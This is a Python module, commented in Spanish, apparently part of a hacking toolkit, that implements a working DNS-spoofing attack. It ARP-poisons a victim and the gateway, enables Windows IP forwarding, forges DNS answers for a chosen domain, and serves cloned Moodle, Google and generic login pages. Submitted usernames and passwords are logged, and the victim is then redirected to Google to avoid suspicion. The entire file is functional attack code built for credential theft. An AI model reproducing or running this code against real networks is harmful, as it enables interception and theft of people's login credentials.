"""
Módulo DNS_SPOOF — DNS Spoofing real con ARP poisoning + servidor HTTP integrado

Flujo completo:
  1. Activa ARP spoofing unidireccional sobre la IP víctima
     (le dice que el gateway está en tu MAC → su tráfico pasa por ti)
  2. Activa IP forwarding en Windows para que el resto del tráfico
     de la víctima siga funcionando (no cae internet, solo se redirige el dominio)
  3. Escucha peticiones UDP/53 con Scapy y responde con tu IP cuando
     coincide el dominio objetivo
  4. Levanta un servidor HTTP en el puerto 80 que sirve la página falsa elegida
"""

import threading
import time
import subprocess
import socket
import socketserver
import http.server
import json
import os

from modulos.config import _estado, IP_LOCAL, GATEWAY, DIR_BASE
from modulos.network_core import _obtener_mac


# ─── Páginas disponibles ──────────────────────────────────────────────────────
# Se pueden ampliar añadiendo archivos HTML en data/pages/
_PAGINAS_BUILTIN = {
    "Moodle (login)": """<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Moodle — Iniciar sesión</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#f4f4f4;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
  .card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.15);padding:44px 48px;width:380px}
  .logo{text-align:center;margin-bottom:28px}
  h1{font-size:1.4rem;font-weight:700;color:#1a1a2e;text-align:center;margin-bottom:6px}
  .subtitle{font-size:.85rem;color:#888;text-align:center;margin-bottom:28px}
  label{font-size:.85rem;color:#444;font-weight:600;display:block;margin-bottom:4px}
  input{width:100%;padding:10px 14px;border:1px solid #ddd;border-radius:8px;font-size:.95rem;margin-bottom:18px;outline:none}
  input:focus{border-color:#f98012}
  button{width:100%;padding:12px;background:linear-gradient(135deg,#f98012,#e05e00);color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:700;cursor:pointer}
  .footer{text-align:center;margin-top:20px;font-size:.78rem;color:#bbb}
  .brand{color:#f98012;font-weight:800}
</style></head>
<body><div class="card">
  <div class="logo"><svg width="70" height="70" viewBox="0 0 200 200" fill="none">
    <circle cx="100" cy="100" r="100" fill="#f98012"/>
    <text x="50%" y="54%" dominant-baseline="middle" text-anchor="middle" fill="white" font-size="90" font-family="Arial" font-weight="bold">M</text>
  </svg></div>
  <h1>Iniciar sesión</h1>
  <p class="subtitle">Accede a tu cuenta <span class="brand">Moodle</span></p>
  <form method="POST" action="/login">
    <label for="username">Nombre de usuario</label>
    <input type="text" id="username" name="username" placeholder="Introduce tu usuario" required>
    <label for="password">Contraseña</label>
    <input type="password" id="password" name="password" placeholder="Introduce tu contraseña" required>
    <button type="submit">Acceder</button>
  </form>
  <p class="footer">© 2025 Plataforma educativa</p>
</div></body></html>""",

    "Google (login falso)": """<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google — Iniciar sesión</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#fff;font-family:'Google Sans',Roboto,Arial,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}
  .logo{font-size:3rem;font-weight:300;letter-spacing:-2px;margin-bottom:8px}
  .logo span{display:inline-block}
  .card{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:40px 40px 36px;width:448px;max-width:95vw}
  h1{font-size:1.5rem;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
  p{font-size:.875rem;color:#5f6368;text-align:center;margin-bottom:24px}
  input{width:100%;padding:14px 15px;border:1px solid #dadce0;border-radius:4px;font-size:.875rem;margin-bottom:20px;outline:none}
  input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
  .btn{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:.875rem;font-weight:500;cursor:pointer;letter-spacing:.01em}
  .btn:hover{background:#1557b0}
  .g-b{color:#4285f4}
  .o-o{color:#ea4335}
  .g-o{color:#fbbc05}
  .g-g{color:#34a853}
</style></head>
<body>
  <div style="margin-bottom:24px;font-size:3rem;font-weight:300">
    <span class="g-b">G</span><span class="o-o">o</span><span class="g-o">o</span><span class="g-b">g</span><span class="g-g">l</span><span class="o-o">e</span>
  </div>
  <div class="card">
    <h1>Iniciar sesión</h1>
    <p>Usa tu cuenta de Google</p>
    <form method="POST" action="/login">
      <input type="email" name="username" placeholder="Correo electrónico o teléfono" required>
      <input type="password" name="password" placeholder="Contraseña" required>
      <button class="btn" type="submit">Siguiente</button>
    </form>
  </div>
</body></html>""",

    "Login Genérico": """<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Iniciar sesión</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#1a1a2e;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
  .card{background:#16213e;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.5);padding:48px 44px;width:380px;border:1px solid #0f3460}
  h1{font-size:1.6rem;font-weight:700;color:#e94560;text-align:center;margin-bottom:6px}
  p{color:#a0a0b0;text-align:center;font-size:.85rem;margin-bottom:28px}
  label{font-size:.82rem;color:#90a0b0;font-weight:600;display:block;margin-bottom:5px}
  input{width:100%;padding:12px 16px;background:#0f3460;border:1px solid #1a4a8a;border-radius:8px;color:#e0e0e0;font-size:.95rem;margin-bottom:18px;outline:none}
  input:focus{border-color:#e94560}
  button{width:100%;padding:13px;background:#e94560;color:#fff;border:none;border-radius:8px;font-size:1rem;font-weight:700;cursor:pointer}
  button:hover{background:#c73652}
</style></head>
<body><div class="card">
  <h1>🔐 Acceso</h1>
  <p>Introduce tus credenciales para continuar</p>
  <form method="POST" action="/login">
    <label>Usuario</label>
    <input type="text" name="username" placeholder="Nombre de usuario" required>
    <label>Contraseña</label>
    <input type="password" name="password" placeholder="Contraseña" required>
    <button type="submit">Entrar</button>
  </form>
</div></body></html>""",
}


class DNSSpoofModule:
    """
    Módulo de DNS Spoofing real.

    Coordina:
      - ARP Poisoning sobre la víctima (con restauración al parar)
      - IP Forwarding en Windows (para no romper el resto del tráfico)
      - Intercepcón de peticiones DNS con Scapy
      - Servidor HTTP que sirve la página falsa y captura credenciales
    """

    def __init__(self, logger_engine):
        self.logger = logger_engine
        self._http_thread  = None
        self._arp_thread   = None
        self._dns_thread   = None
        self._httpd        = None
        self._victim_mac   = None
        self._ip_forwarding_was_on = False
        self._capturas     = []          # lista de (usuario, password, timestamp)
        self._write_cb     = None        # callback principal de escritura

    # ─── API pública ──────────────────────────────────────────────────────────

    def get_pages(self) -> list[str]:
        """Devuelve nombres de páginas disponibles (builtin + archivos en data/pages/)."""
        pages = list(_PAGINAS_BUILTIN.keys())
        pages_dir = os.path.join(DIR_BASE or ".", "data", "pages")
        if os.path.isdir(pages_dir):
            for f in os.listdir(pages_dir):
                if f.endswith(".html"):
                    pages.append(f"📄 {f}")
        return pages

    def start_all(self, dominio: str, ip_victima: str, pagina: str,
                  write_callback, on_stop_callback):
        """
        Inicia ARP + DNS + HTTP server.

        :param dominio:       Dominio a interceptar, ej. 'moodle.instituto.es'
        :param ip_victima:    IP de la víctima, ej. '192.168.1.50'
        :param pagina:        Nombre de la página falsa a servir
        :param write_callback:  Función(str) para mostrar logs en la UI
        :param on_stop_callback: Se llama cuando el módulo para (por error o externamente)
        """
        self._write_cb    = write_callback
        self._on_stop     = on_stop_callback
        self._dominio     = dominio.strip().lstrip("https://").lstrip("http://").strip("/")
        self._ip_victima  = ip_victima.strip()
        self._pagina      = pagina
        self._capturas    = []

        # Marcar estado activo
        _estado["dns"].set()

        write_callback("─" * 50 + "\n")
        write_callback(f"  🎯 Dominio objetivo : {self._dominio}\n")
        write_callback(f"  👤 Víctima          : {self._ip_victima}\n")
        write_callback(f"  🖥  Tu IP            : {IP_LOCAL}\n")
        write_callback(f"  📄 Página falsa     : {pagina}\n")
        write_callback("─" * 50 + "\n")

        # 1. Habilitar IP Forwarding
        self._enable_ip_forwarding(write_callback)

        # 2. Iniciar HTTP server
        self._http_thread = threading.Thread(
            target=self._run_http_server,
            args=(write_callback,),
            daemon=True
        )
        self._http_thread.start()

        # 3. Iniciar ARP Poisoning
        self._arp_thread = threading.Thread(
            target=self._arp_loop,
            args=(write_callback,),
            daemon=True
        )
        self._arp_thread.start()

        # 4. Iniciar DNS Spoofing
        self._dns_thread = threading.Thread(
            target=self._dns_loop,
            args=(write_callback,),
            daemon=True
        )
        self._dns_thread.start()

    def stop_all(self, write_callback):
        """Para todos los componentes y restaura el sistema."""
        _estado["dns"].clear()

        write_callback("■ Deteniendo DNS Spoofing...\n")

        # Parar HTTP server
        if self._httpd:
            try:
                self._httpd.shutdown()
            except Exception:
                pass
            self._httpd = None

        # Restaurar IP Forwarding
        self._disable_ip_forwarding(write_callback)

        write_callback("✔ Todo detenido. Tabla ARP restaurándose...\n")
        self.logger.log("[DNS] Módulo detenido.", "warn")

    def get_capturas(self) -> list:
        return list(self._capturas)

    # ─── IP Forwarding ────────────────────────────────────────────────────────

    def _enable_ip_forwarding(self, write_callback):
        """Habilita el enrutamiento IP en Windows para no cortar internet a la víctima."""
        try:
            # Comprobar estado actual
            out = subprocess.check_output(
                ["reg", "query",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter"],
                stderr=subprocess.DEVNULL, creationflags=0x08000000
            ).decode(errors="ignore")
            self._ip_forwarding_was_on = "0x1" in out.lower()

            if not self._ip_forwarding_was_on:
                subprocess.run(
                    ["reg", "add",
                     r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                     "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "1", "/f"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    creationflags=0x08000000
                )
                write_callback("✔ IP Forwarding activado (se restaurará al parar).\n")
                self.logger.log("[DNS] IP Forwarding ON.", "ok")
            else:
                write_callback("✔ IP Forwarding ya estaba activo.\n")
        except Exception as e:
            write_callback(f"⚠ No se pudo activar IP Forwarding: {e}\n")
            write_callback("  → La víctima podría perder internet mientras esté activo.\n")

    def _disable_ip_forwarding(self, write_callback):
        """Restaura el IP Forwarding a su estado original."""
        if self._ip_forwarding_was_on:
            return  # Estaba activado antes, no lo tocamos
        try:
            subprocess.run(
                ["reg", "add",
                 r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                 "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "0", "/f"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                creationflags=0x08000000
            )
            write_callback("✔ IP Forwarding desactivado (restaurado).\n")
        except Exception:
            pass

    # ─── ARP Poisoning ────────────────────────────────────────────────────────

    def _arp_loop(self, write_callback):
        """ARP Spoofing bidireccional: envenena víctima Y gateway para MITM completo."""
        try:
            from scapy.all import Ether, ARP, sendp
        except ImportError:
            write_callback("✗ Scapy no disponible — ARP Spoofing omitido.\n")
            return

        gw = GATEWAY
        ip_victima = self._ip_victima

        write_callback(f"» Resolviendo MACs (víctima={ip_victima}, gw={gw})...\n")

        mac_victima = _obtener_mac(ip_victima)
        mac_gateway = _obtener_mac(gw)

        if not mac_victima:
            write_callback(f"✗ No se obtuvo MAC de la víctima ({ip_victima}). ¿Está activa en la red?\n")
            self.logger.log(f"[DNS/ARP] Sin MAC para {ip_victima}", "err")
            return

        if not mac_gateway:
            write_callback(f"⚠ No se obtuvo MAC del gateway ({gw}). Solo se envenena la víctima.\n")

        self._victim_mac = mac_victima
        self._victim_mac_real = mac_victima
        self._gw_mac_real = mac_gateway

        write_callback(f"✔ MAC víctima  : {mac_victima}\n")
        write_callback(f"✔ MAC gateway  : {mac_gateway or '(desconocida)'}\n")

        # Paquetes de envenenamiento
        # → A la víctima: "el gateway está en TU MAC" (le hacemos creer que somos el router)
        pkt_victima = (
            Ether(dst=mac_victima) /
            ARP(op=2, pdst=ip_victima, hwdst=mac_victima,
                psrc=gw)
        )
        # → Al gateway: "la víctima está en TU MAC" (le hacemos creer que somos la víctima)
        if mac_gateway:
            pkt_gateway = (
                Ether(dst=mac_gateway) /
                ARP(op=2, pdst=gw, hwdst=mac_gateway,
                    psrc=ip_victima)
            )
        else:
            pkt_gateway = None

        write_callback("✔ ARP Spoofing bidireccional activo.\n")
        self.logger.log(f"[DNS/ARP] MITM → {ip_victima} ↔ {gw}", "warn")

        try:
            while _estado["dns"].is_set():
                sendp(pkt_victima, verbose=0)
                if pkt_gateway:
                    sendp(pkt_gateway, verbose=0)
                time.sleep(2)
        except Exception as e:
            write_callback(f"✗ ARP error: {e}\n")
        finally:
            # Restaurar ARP
            self._restore_arp(write_callback, ip_victima, gw, mac_victima, mac_gateway)

    def _restore_arp(self, write_callback, ip_victima, gw, mac_victima, mac_gateway):
        """Restaura las tablas ARP a su estado legítimo."""
        try:
            from scapy.all import Ether, ARP, sendp
            if mac_gateway:
                rest_v = (Ether(dst=mac_victima) /
                          ARP(op=2, pdst=ip_victima, hwdst=mac_victima,
                              psrc=gw, hwsrc=mac_gateway))
                sendp(rest_v, count=5, verbose=0)
            if mac_victima and mac_gateway:
                rest_g = (Ether(dst=mac_gateway) /
                          ARP(op=2, pdst=gw, hwdst=mac_gateway,
                              psrc=ip_victima, hwsrc=mac_victima))
                sendp(rest_g, count=5, verbose=0)
            write_callback("✔ Tabla ARP restaurada.\n")
            self.logger.log("[DNS/ARP] ARP restaurado.", "ok")
        except Exception as e:
            write_callback(f"⚠ No se pudo restaurar ARP: {e}\n")

    # ─── DNS Spoofing ─────────────────────────────────────────────────────────

    def _dns_loop(self, write_callback):
        """
        Escucha peticiones DNS (UDP/53) con Scapy y responde con nuestra IP
        cuando el dominio coincide. Soporta consultas A y AAAA.
        Incluye el flag RA=1 para que los clientes acepten la respuesta.
        """
        try:
            from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, DNSRRAAAA, send, sniff
        except ImportError:
            write_callback("✗ Scapy no disponible.\n")
            return

        dominio = self._dominio
        ip_local = IP_LOCAL
        ip_victima = self._ip_victima

        write_callback(f"✔ DNS Spoofing activo — interceptando: {dominio}\n")
        self.logger.log(f"[DNS] Escuchando peticiones de {dominio}", "warn")

        def proc(pkt):
            if not _estado["dns"].is_set():
                return
            # Solo procesar UDP port 53 de la víctima
            if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
                return
            if pkt[IP].src != ip_victima:
                return
            if pkt[DNS].qr != 0:  # Solo queries (qr=0), no respuestas
                return

            try:
                nombre = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            except Exception:
                return

            if dominio not in nombre:
                return

            qtype = pkt[DNSQR].qtype  # 1=A, 28=AAAA

            # Construir respuesta según el tipo de consulta
            if qtype == 28:  # AAAA (IPv6) → respondemos con error / sin registros
                resp = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(id=pkt[DNS].id, qr=1, aa=1, ra=1, qd=pkt[DNS].qd,
                        ancount=0)  # sin respuesta IPv6 → el cliente usará IPv4
                )
            else:  # A (IPv4)
                resp = (
                    IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                    UDP(dport=pkt[UDP].sport, sport=53) /
                    DNS(id=pkt[DNS].id, qr=1, aa=1, ra=1, qd=pkt[DNS].qd,
                        an=DNSRR(rrname=pkt[DNSQR].qname, type="A",
                                 ttl=1, rdata=ip_local))
                )

            send(resp, verbose=0)
            tipo_str = "AAAA(vacío)" if qtype == 28 else f"A→{ip_local}"
            write_callback(f"  ↬ [{tipo_str}] {nombre}\n")
            self.logger.log(f"[DNS] {nombre} → {ip_local}", "pkt")

        try:
            # Escuchar solo tráfico UDP/53 de la víctima para mayor precisión
            bpf = f"udp port 53 and src host {ip_victima}"
            sniff(filter=bpf, prn=proc,
                  stop_filter=lambda _: not _estado["dns"].is_set(),
                  store=False)
        except Exception as e:
            write_callback(f"✗ DNS error: {e}\n")
            self.logger.log(f"[DNS] Error sniff: {e}", "err")
        finally:
            _estado["dns"].clear()

    # ─── Servidor HTTP ────────────────────────────────────────────────────────

    def _get_page_html(self) -> str:
        """Devuelve el HTML de la página falsa seleccionada."""
        pagina = self._pagina

        # Página builtin
        if pagina in _PAGINAS_BUILTIN:
            return _PAGINAS_BUILTIN[pagina]

        # Archivo HTML de data/pages/
        nombre = pagina.lstrip("📄 ")
        ruta = os.path.join(DIR_BASE or ".", "data", "pages", nombre)
        if os.path.isfile(ruta):
            try:
                with open(ruta, "r", encoding="utf-8", errors="ignore") as f:
                    return f.read()
            except Exception:
                pass

        # Fallback
        return _PAGINAS_BUILTIN["Login Genérico"]

    def _run_http_server(self, write_callback):
        """Levanta el servidor HTTP en el puerto 80."""
        html_content = self._get_page_html()
        capturas_ref  = self._capturas
        logger         = self.logger
        dominio        = self._dominio

        # Directorio de logs
        log_dir = os.path.join(DIR_BASE or ".", "logs")
        os.makedirs(log_dir, exist_ok=True)
        capturas_file = os.path.join(log_dir, "dns_capturas.txt")

        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self, fmt, *args):
                pass  # Silenciar logs de acceso

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                self.wfile.write(html_content.encode("utf-8"))

            def do_POST(self):
                length = int(self.headers.get("Content-Length", 0))
                body = self.rfile.read(length).decode("utf-8", errors="ignore")

                # Parsear campos del formulario
                import urllib.parse
                campos = dict(urllib.parse.parse_qsl(body))
                usuario = campos.get("username", campos.get("email", ""))
                password = campos.get("password", "")
                ts = time.strftime("%Y-%m-%d %H:%M:%S")

                # Guardar captura
                entrada = {
                    "timestamp": ts,
                    "ip_origen": self.client_address[0],
                    "usuario": usuario,
                    "password": password,
                    "dominio": dominio,
                    "campos_raw": campos,
                }
                capturas_ref.append(entrada)

                # Escribir al archivo
                try:
                    with open(capturas_file, "a", encoding="utf-8") as f:
                        f.write(f"[{ts}] IP={self.client_address[0]} "
                                f"user={usuario!r} pass={password!r} "
                                f"dom={dominio}\n")
                except Exception:
                    pass

                logger.log(
                    f"[DNS] 🔑 CAPTURA: {usuario!r} / {password!r} desde {self.client_address[0]}",
                    "err"
                )

                # Escribir en la UI desde el hilo del servidor
                try:
                    write_callback(
                        f"\n{'!'*48}\n"
                        f"  🔑 CREDENCIALES CAPTURADAS\n"
                        f"  Timestamp : {ts}\n"
                        f"  IP víctima: {self.client_address[0]}\n"
                        f"  Usuario   : {usuario}\n"
                        f"  Contraseña: {password}\n"
                        f"{'!'*48}\n\n"
                    )
                except Exception:
                    pass

                # Redirigir al sitio real para no levantar sospechas
                self.send_response(302)
                self.send_header("Location", f"http://www.google.com")
                self.end_headers()

        try:
            self._httpd = socketserver.TCPServer(("", 80), Handler)
            self._httpd.allow_reuse_address = True
            write_callback(f"✔ Servidor HTTP activo en puerto 80 → esperando conexiones de {dominio}...\n")
            self.logger.log("[DNS] HTTP server escuchando :80", "ok")
            self._httpd.serve_forever()
        except PermissionError:
            write_callback("✗ Puerto 80 denegado. Ejecuta como Administrador.\n")
            self.logger.log("[DNS] Error: puerto 80 sin permisos.", "err")
        except OSError as e:
            if "10048" in str(e) or "address already in use" in str(e).lower():
                write_callback("✗ Puerto 80 en uso por otro proceso. Libéralo primero.\n")
            else:
                write_callback(f"✗ HTTP error: {e}\n")
            self.logger.log(f"[DNS] HTTP error: {e}", "err")
        except Exception as e:
            write_callback(f"✗ HTTP error: {e}\n")
            self.logger.log(f"[DNS] HTTP error: {e}", "err")
